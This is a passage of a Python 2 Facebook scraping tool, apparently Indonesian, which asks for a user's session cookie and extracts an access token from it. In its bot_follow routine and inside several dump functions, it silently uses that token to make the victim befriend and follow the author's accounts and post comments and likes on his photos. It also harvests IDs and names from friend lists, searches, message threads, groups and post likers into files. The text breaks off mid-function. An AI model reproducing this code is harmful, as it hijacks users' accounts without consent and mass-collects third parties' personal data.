#-*-coding:utf-8-*-
import os,re,sys,itertools,time,requests,random,threading,json,random,datetime,bs4
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from urllib2 import urlopen
from cek_opsi import cek_opsi
reload(sys)
sys.setdefaultencoding('utf8')
"""   Terimaksih Untuk Semuanya   """
#####################################
"""

Pastikan Jangan Ubah Bot Follownya !
Kalo Mau Tinggal Tambahin Faham?
Dan Jika Ingin Di Ganti Izin Dulu :v

 				  """
#####################################
logo = ("""\x1b[1;92m ___ ___ ___ __  __ ___ _   _ __  __
\x1b[1;92m| _ \ _ \ __|  \/  |_ _| | | |  \/  |
\x1b[1;96m|  _/   / _|| |\/| || || |_| | |\/| |
\x1b[1;96m|_| |_|_\___|_|  |_|___|\___/|_|  |_|
\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m——————————————————————————————
\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m au : rozhak
\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m fb : fb.com/rozhak.xyz
\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m gh : github.com/rozhakxd
\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m——————————————————————————————
""")
ok = []
cp = []
live = []
chek = []
die = []
loop = 0
stop = False
link =("https://gramho.com")
hostm=("https://m.facebook.com")
url=('http://ipinfo.io/json')
response=urlopen(url)
data=json.load(response)
ip=data['ip']
org=data['org']
region=data['region']
useragent=random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",])
uac=("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
def basecookie():
	if os.path.exists("_____rozhak_____"):
		if os.path.getsize("_____rozhak_____") !=0:
			return gets_dict_cookies(open('_____rozhak_____').read().strip())
		else:login()
	else:login()
def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
def cvd(cookies):
    result = {}
    try:
        for i in cookies.split(';'):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
    except:
        for i in cookies.split('; '):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
def hdcok():
	global hostm,uac
	hosts=hostm
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": uac, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r
def login():
	os.system('clear')
	print(logo)
	print("\x1b[1;92m[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Login Pakai Cookie")
	print("\x1b[1;92m[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Cara Dapat Cookie")
	print("\x1b[1;92m[\x1b[1;93m0\x1b[1;92m]\x1b[1;93m Keluar")
	login = raw_input("\n\x1b[1;92m[\x1b[1;97m#\x1b[1;92m] Choose :\x1b[1;96m ")
	if login == "":
		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m] \x1b[1;91mWrong Input")
	elif login == "1":
		try:
			cookie = raw_input("\x1b[1;92m[\x1b[1;96m*\x1b[1;92m]\x1b[1;96m Cookie :\x1b[1;93m ")
	                data = {
	                            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
	                                'referer' : 'https://m.facebook.com/',
	                                'host' : 'm.facebook.com',
	                                'origin' : 'https://m.facebook.com',
	                                'upgrade-insecure-requests' : '1',
	                                'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
	                                'cache-control' : 'max-age=0',
	                                'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	                                'content-type' : 'text/html; charset=utf-8',
	                                 'cookie' : cookie }
	                coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
        	        cari = re.search('(EAAA\w+)', coki.text)
	                hasil = cari.group(1)
	                cok = open('_____rozhak_____', 'w')
	                cok.write(cookie)
	                cok.close()
	                tok = open('___rozhak___', 'w')
	                tok.write(hasil)
	                tok.close()
	                bot_follow()
	        except AttributeError,UnboundLocalError:
	                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Salah')
	                time.sleep(2)
	                login()
		except requests.exceptions.ConnectionError:
			exit("\x1b[1;92m[\x1b[1;93m•\x1b[1;92m]\x1b[1;93m Koneksi Error")
	elif login == "2":
		print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Anda Akan Diarahkan Ke Browser")
		time.sleep(3)
		os.system("xdg-open https://youtu.be/3Y6xsMB3wRg")
		exit()
	elif login == "0":
		exit()
	else:
		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
def cek_cookie():
	cvds=None
        new=None
        if cek(1)==False:
                try:
                        cookie=cvd(open("_____rozhak_____").read().strip())
                        cvds=cvd(cookie)
                        new=True
                except:
                        print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid");login()
        else:
                cvds=cvd(open("_____rozhak_____").read().strip())
        r=requests.get("https://mbasic.facebook.com/profile.php",
                cookies=cvds,
        headers=hdcok()).text
        if len(bs4.re.findall("logout",r)) !=0:
		print('\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mengecek Cookie')
		time.sleep(2)
                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selamat Datang :\x1b[1;93m %s"%(
                        bs4.BeautifulSoup(r,
                "html.parser").find("title").text[0:20]))
		time.sleep(3)
		menu()
	else:
                try:
                        os.remove("_____rozhak_____")
                except:
                        pass
                print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid");login()
def bot_follow():
	try:
		token=open('___rozhak___','r').read()
	except IOError:
		print ("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m] \x1b[1;91mCookie Invalid")
		os.system('rm -rf ___rozhak___')
		time.sleep(2)
		login()
	web = datetime.datetime.now()
        waktu = web.strftime("%H:%M:%S / %d-%m-%Y ")
        love = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
	kata_kata_cinta = random.choice(["Cinta sejati bukan berarti tidak terpisahkan. Itu hanya berarti dipisahkan, namun tidak ada yang berubah."," Aku tahu aku jatuh cinta padamu karena kenyataanku akhirnya lebih indah dari mimpiku.","Kamu adalah pikiran terakhir dalam pikiranku sebelum tertidur dan pikiran pertama ketika aku bangun setiap pagi.","Bagi dunia, kamu mungkin satu orang, tetapi bagi satu orang kamu adalah dunia.","Kamu telah mengganti mimpi burukku dengan mimpi indah, kekhawatiranku dengan kebahagiaan, dan ketakutanku dengan cinta.","Kamu mungkin memegang tanganku untuk sementara waktu, tetapi kamu memegang hatiku selamanya.","Kekasihku, janganlah engkau menangis, berbahagialah kekasihku, jangan ada duka yang menyelimutimu. Aku berharap kau selalu dalam keadaan bahagia meski dari jauh aku saja tak bisa membahagiakanmu dan membuatmu tertawa.","Ketika seseorang membuat kamu menjadi orang yang paling bahagia dan orang paling menyedihkan pada saat yang sama, itulah saat yang nyata. Itu adalah sesuatu yang berharga.","Tidak peduli berapa banyak perkelahian yang mungkin kamu alami, jika kamu benar-benar mencintai seseorang, itu tidak akan menjadi masalah pada akhirnya.","Dicintai secara mendalam oleh seseorang memberimu kekuatan. Mencintai seseorang secara mendalam memberimu keberanian.","Cinta sejati tidak harus berarti menyatu, terkadang cinta sejati itu terpisah namun tak ada yang berubah.","Saat pagi datang, senyumanmu memeluk pikiranku, saat siang datang kau bagaikan payung yang selalu membuatku teduh, dan saat malam kau adalah kehangatan yang selalu membuatku jauh dari kedinginan.","Mencintai merupakan sebuah anugerah besar yang Tuhan berikan kepada manusia. Maka dari itu, kita perlu senantiasa bersyukur dan menjaga segala anugerah itu.","Mungkin ketidaksempurnaan kita yang membuat kita begitu sempurna satu sama lain.","Aku yakin bahwa cinta kita nanti akan bersatu dalam ikatan suci."])
	kata_utama = ("Pengguna Script Premium ")
	komen = kata_utama+love+"\n"+kata_kata_cinta+"\n"+waktu
	kata_mutiara_islam = random.choice(["Kita tidak akan pernah tahu bagimana menyembahNya sebelum kita mulai dengan bagaimana mencintaiNya.","Apakah engkau meremehkan suatu doa kepada Allah, apakah engkau tahu keajaiban dan kemukjizatan doa? Ibarat panah dimalam hari, ia tidak akan meleset namun ia punya batas dan setiap batas ada saatnya untuk selesai.","Jangan berjalan dimuka bumi dengan penuh kesombongan dan congkak karena sebentar lagi engkau akan masuk ke dalam bumi juga.","Barang siapa yang bersungguh-sungguh berjalan pada jalannya maka pasti ia akan sampai pada tujuannya.","Ilmu pengetahuan di waktu kecil itu bagaikan ukiran di atas batu.","Bukanlah anak yatim itu yang telah meninggal orangtuanya, tetapi sesungguhnya yatim itu adalah yatim ilmu dan akhlak.","Ilmu tanpa agama adalah suatu kecacatan, dan agama tanpa ilmu merupakan kebutaan","Kegagalan adalah cara Allah untuk mengatakan bersabarlah karena aku memiliki sesuatu yang lebih baik untukmu saat waktunya tiba.","Kita tidak akan pernah kalah sampai kita menyerahkan semuanya kepada Tuhan.","Bagimu agamamu, bagiku agamaku. Karena sesungguhnya tidaka ada paksaan dalam beragama.","Sabar dan bisa mengikhlaskan sesuatu yang telah pergi adalah salah satu cara untuk mendapatkan kebahagian."])
	kata_utama2 = random.choice(["Hai Bang 😎","Hello Bang 😎","Hello Bro 😎","Hai Bro 😎"])
	komen2 = kata_utama2+"\n"+kata_mutiara_islam+"\n"+waktu
	pantun_motivasi = random.choice(["Jalan-jalan naik kereta, Naik ke atas pakai tangga. Mari kita gapai cita-cita, Bahagia dunia, masuk ke surga.","Pisau tajam dari baja, Parang panjang banyak guna. Membayar sukses dengan kerja, Bayar sekarang, kelak bahagia.","Sampan sudah, rakit sudah, Yang belum hanya bahteranya. Sarapan sudah, ngopi sudah, Yang belum tinggal kerjanya.","Kapas terhembus angin ringan, Sejuk terasa angin pantai. Lebih bahagia dalam perjuangan, Daripada dalam santai-santai."])
	kata_utama3 = ("I love you @[757953543:]")
	komen3 = kata_utama3+"\n"+pantun_motivasi+"\n"+waktu
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=100064814153036&access_token='+token) #Rozhak
	requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token) #Rozhak
        requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token='+token) #Muhammad Rozhak
	requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token='+token) #Rozhak
	requests.post('https://graph.facebook.com/10159494942223544/comments/?message='+komen+'&access_token='+token) #Foto Profil
	requests.post('https://graph.facebook.com/10159494942223544/likes?summary=true&access_token='+token) #Foto Profil
	requests.post('https://graph.facebook.com/10159494942223544/comments/?message='+komen3+'&access_token='+token) # Foto Profil
	requests.post('https://graph.facebook.com/10158807643598544/comments/?message='+komen2+'&access_token='+token) #Foto Sampul
	print("\x1b[1;96m[\x1b[1;92m#\x1b[1;96m]\x1b[1;92m Login Berhasil")
	menu()
def publik_fast():
        try:
                token=open('___rozhak___','r').read()
        except IOError:
                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookies Invalid')
                os.system('rm -rf ___rozhak___')
                time.sleep(2)
                login()
        try:
                idt = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Profil ID :\x1b[1;96m ")
                file = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
                try:
                        req = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                        op = json.loads(req.text)
                        print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m "+op["name"])
                except KeyError:
                        print('\x1b[1;91m[\x1b[1;93m•\x1b[1;92m]\x1b[1;93m Profil Tidak Ditemukan')
                        raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                        menu()
                r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(9999999)&access_token="+token)
                id = []
                z=json.loads(r.text)
                fle = open(file , 'a')#.replace(" ","_")
                for a in z['friends']['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        fle.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;92m ID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                fle.close()
                print("\r\x1b[1;92m                     ")
                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai")
                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m "+file)
                raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                menu()

        except KeyError:
                print('\n\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Teman')
                raw_input('\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}')
                menu()
	except requests.exceptions.ConnectionError:
		exit("\x1b[1;97m[\x1b[1;93m•\x1b[1;97m]\x1b[1;93m Koneksi Error")
class friendlist:

    def __init__(self, cookie):
        self.nitel = None
        self.cookie = cookie
	user = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Username :\x1b[1;96m ")
        self.id = ("https://www.facebook.com/"+user)
        if self.id == '':
            friendlist(cookie)
        else:
            self.fl = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
            open(self.fl, 'a+')
            id = ('').join(bs4.re.findall('://(.*?)/', self.id))
            if len(id) == 0:
                friendlist(cookie)
            self.ok = bs4.re.sub(id, 'm.facebook.com', self.id).replace('profile.php?id=', '') + '?v=friends'
            self.dump(self.ok)
        return

    def dump(self, ok):
        r = bs4.BeautifulSoup(requests.get(ok, headers=hdcok(), cookies=self.cookie).text, 'html.parser')
        if self.nitel == None:
            a = r.find('title').text[0:20]
            self.nitel = a
            b = r.find('h3').text.split(' ').pop().replace(')', '').replace('(', '').replace('.', '')
            self.b = b
            print('\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m %s' % a)
        for i in r.find_all('a', href=True):
            if 'fref' in i.get('href'):
                print"\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;97m/\x1b[1;96m%s \x1b[1;92mID \x1b[1;97m*\x1b[1;93mtype ctrl+z to stop" % (len(open(self.fl).read().splitlines()), self.b),;sys.stdout.flush();time.sleep(0.007)
                if 'profile_add_friend.php' in i.get('href'):
                    continue
                elif 'profile.php' in i.get('href'):
                    ag = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', i.get('href')))
                    if len(ag) != 0:
                        if ag in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (ag, i.text))
                else:
                    ag = ('').join(bs4.re.findall('/(.*?)\\?', i.get('href')))
                    if len(ag) != 0:
                        if ag in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (ag, i.text))
            if 'lihat teman lain' in i.text.lower():
                __import__('time').sleep(0.1)
                while True:
                    try:
                        self.dump('https://m.facebook.com/' + i.get('href'))
                        __import__('time').sleep(0.1)
                        break
                    except Exception as e:
                        print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Dump Gagal %s' % e)
                        continue
	print("\r\x1b[1;97m                                              ")
	print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai')
	print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m '+self.fl)
	raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;92m}")
	menu()
        return
def search(fl,r,b):
	open(fl,"a+")
	b=bs4.BeautifulSoup(requests.get(
		b, cookies=r,headers=hdcok()).text,"html.parser")
	for i in b.find_all("a",href=True):
		print"\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;92m ID \x1b[1;97m*\x1b[1;93mtype ctrl+z to stop"%(len(open(fl).read().splitlines())),;sys.stdout.flush()
		if "<img alt=" in str(i):
			if "home.php" in str(i["href"]):
				continue
			else:
				g=str(i["href"])
				if "profile.php" in g:
					name=i.find("img").get("alt").replace(", profile picture","")
					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
					if len (d) !=0:
						pk="".join(d)
						if pk in open(fl).read():
							pass
						else:
							open(
								fl,"a+").write("%s<=>%s\n"%(pk,name))
				else:
					d=bs4.re.findall("/(.*?)\?",g)
					name=i.find("img").get("alt").replace(", profile picture","")
					if len(d) !=0:
						pk="".join(d)
						if pk in open(fl).read():
							pass
						else:
							open(
								fl,"a+").write("%s<=>%s\n"%(pk,name))

		if "Lihat Hasil Selanjutnya" in i.text:
			search(fl,r,i["href"])
	print("\r\x1b[1;97m                                              ")
	print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai')
	print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m '+fl)
	raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
	menu()
def cek(arg):
	if os.path.exists("_____rozhak_____"):
		if os.path.getsize("_____rozhak_____") !=0:
			return True
		else:return False
	else:return False
def dumpfl():
	cvds=None
	new=None
	if cek(1)==False:
		try:
			cookie=cvd(open("_____rozhak_____").read().strip())
			cvds=cvd(cookie)
			new=True
		except:
			print("[•] Cookie Invalid");login()
	else:
		cvds=cvd(open("_____rozhak_____").read().strip())
	r=requests.get("https://mbasic.facebook.com/profile.php",
		cookies=cvds,
	headers=hdcok()).text
	if len(bs4.re.findall("logout",r)) !=0:
		if new==True:
			open("_____rozhak_____","w").write(cookie)
		s=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Query :\x1b[1;96m ")
		fl=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
		search(
			fl,cvds,
		"https://m.facebook.com/search/people/?q="+s)
	else:
		try:
			os.remove("_____rozhak_____")
		except:
			pass
		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid");login()
class dump_message:

    def __init__(self, cookies):
        self.cookies = cookies
        self.f = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
        if self.f == '':
            dump_message(cookies)
        open(self.f, 'w').close()
        self.dump('https://m.facebook.com/messages')

    def dump(self, url):
        bs = bs4.BeautifulSoup(requests.get(url, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
        for i in bs.find_all('a', href=True):
            if '/messages/read' in i.get('href'):
                f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
                try:
                    for ip in list(f.pop()):
                        if self.cookies.get(' c_user') in ip:
                            continue
                        else:
                            if 'pengguna facebook' in i.text.lower():
                                continue
                            open(self.f, 'a+').write('%s<=>%s\n' % (ip, i.text))
                            print"\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;92m ID \x1b[1;97m*\x1b[1;93mtype ctrl+z to stop" % len(open(self.f).read().splitlines()),;sys.stdout.flush();time.sleep(0.007)

                except Exception as e:
		    print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Dump Gagal %s' % e)
                    continue

            if 'Lihat Pesan Sebelumnya' in i.text:
                self.dump('https://m.facebook.com/' + i.get('href'))

	print("\r\x1b[1;97m                                              ")
	print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai')
	print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m '+self.f)
	raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
	menu()
def like_post():
        try:
                token=open('___rozhak___','r').read()
        except IOError:
		print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
                os.system('rm -rf ___rozhak___')
                time.sleep(2)
                login()
        try:
                idt = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Post ID :\x1b[1;96m ")
                file = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
                try:
                   r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=99999999&access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                except KeyError:
			print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Post ID Tidak Ada')
			raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                        menu()
                id = []
                z=json.loads(r.text)
                fle = open(file , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        fle.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s \x1b[1;92mID \r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                fle.close()
		print("\r\x1b[1;97m                   ")
		print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai")
		print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m "+file)
		raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
		menu()

	except requests.exceptions.ConnectionError:
		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Koneksi Error")
class dump_grup:

    def __init__(self, cookies):
        self.glist = []
        self.cookies = cookies
        self.extract('https://m.facebook.com/groups/?seemore')

    def extract(self, url):
        bs = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
        for i in bs.find_all('a', href=True):
            if '/groups/' in i.get('href'):
                if 'category' in i.get('href') or 'create' in i.get('href'):
                    continue
                else:
                    self.glist.append({'id': ('').join(bs4.re.findall('/groups/(.*?)\\?', i.get('href'))), 
                       'name': i.text})

        if len(self.glist) != 0:
            print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Anda Memiliki\x1b[1;96m %s\x1b[1;92m Grup' % len(self.glist))
            print('\x1b[1;92m[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Dapatkan Grup Dari Cari Nama')
            print('\x1b[1;92m[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Masukan ID Grup\x1b[1;92m/\x1b[1;97mManual')
            while True:
                c = raw_input(' \x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Choose :\x1b[1;96m ')
                if c == '':
                    continue
                elif c == '1':
                    self.search()
                    exit()
                elif c == '2':
                    self.manual()
                    exit()
                else:
		    exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")

        else:
            exit('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Grub Tidak Ditemukan')

    def manual(self):
        id = raw_input('\n\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Grub ID :\x1b[1;96m ')
        if id == '':
            self.manual()
        else:
            r = bs4.BeautifulSoup(requests.get('https://m.facebook.com/groups/' + id, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
            if 'konten tidak' in r.find('title').text.lower():
                exit('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Grub ID Tidak Valid\x1b[1;93m/\x1b[1;91mAnda Belum Bergabung Grup')
            else:
                self.listed = {'id': id, 'name': r.find('title').text}
                self.f()
                print('\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama Grub :\x1b[1;96m %s' % self.listed.get('name')[0:15])
                self.dumps('https://m.facebook.com/groups/' + id)

    def search(self):
        whitelist = []
        q = raw_input('\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Grup Name :\x1b[1;96m ').lower()
        if q == '':
            self.search()
        else:
            for e, i in enumerate(self.glist):
                if q in i.get('name').lower():
                    whitelist.append(i)
                    print '\x1b[1;92m [\x1b[1;97m%s\x1b[1;92m]\x1b[1;97m %s' % (
                     len(whitelist),
                     i.get('name').lower().replace(q, '%s' % (q)))

            if len(whitelist) == 0:
                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Hasil Untuk :\x1b[1;93m %s' % q)
                self.search()
            else:
                print("\x1b[1;97m ")
                self.choice(whitelist)

    def choice(self, whitelist):
        try:
            self.listed = whitelist[(input('\n\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Pilih Grup :\x1b[1;96m ') - 1)]
            self.f()
            print('\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m %s' % self.listed.get('name'))
            self.dumps('https://m.facebook.com/groups/' + self.listed.get('id'))
        except Exception as e:
            print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Dump Error %s' % e)
            self.choice(whitelist)

    def f(self):
        self.fl = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
        if self.fl == '':
            self.fl()
        open(self.fl, 'w').close()

    def dumps(self, url):
        r = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
        print"\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;97m ID \x1b[1;97m*\x1b[1;93mtype ctrl+z to stop\r" % len(open(self.fl).read().splitlines()),;sys.stdout.flush();time.sleep(0.007)
        for i in r.find_all('h3'):
            try:
                if len(bs4.re.findall('\\/', i.find('a', href=True).get('href'))) == 1:
                    ogeh = i.find('a', href=True)
                    if 'profile.php' in ogeh.get('href'):
                        a = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
                            continue
                    else:
                        a = ('').join(bs4.re.findall('/(.*?)\\?', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
            except:
                continue

        for i in r.find_all('a', href=True):
            if 'Lihat Postingan Lainnya' in i.text:
                while True:
                    try:
                        self.dumps('https://m.facebook.com/' + i.get('href'))
                        break
                    except Exception as e:
                        print('\r\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m %s\x1b[1;97m,\x1b[1;93m Mencoba Lagi' % e)
                        continue

	print("\r\x1b[1;97m                                              ")
	print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai')
	print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m '+self.fl)
	raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
	menu()
def follower():
        try:
                token=open('___rozhak___','r').read()
        except IOError:
                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
                os.system('rm -rf ___rozhak___')
                time.sleep(2)
                login()
        try:
                idt = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Profil ID :\x1b[1;96m ")
                file = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
                try:
                        req = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                        op = json.loads(req.text)
                        print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama : \x1b[1;96m"+op["name"])
                except KeyError:
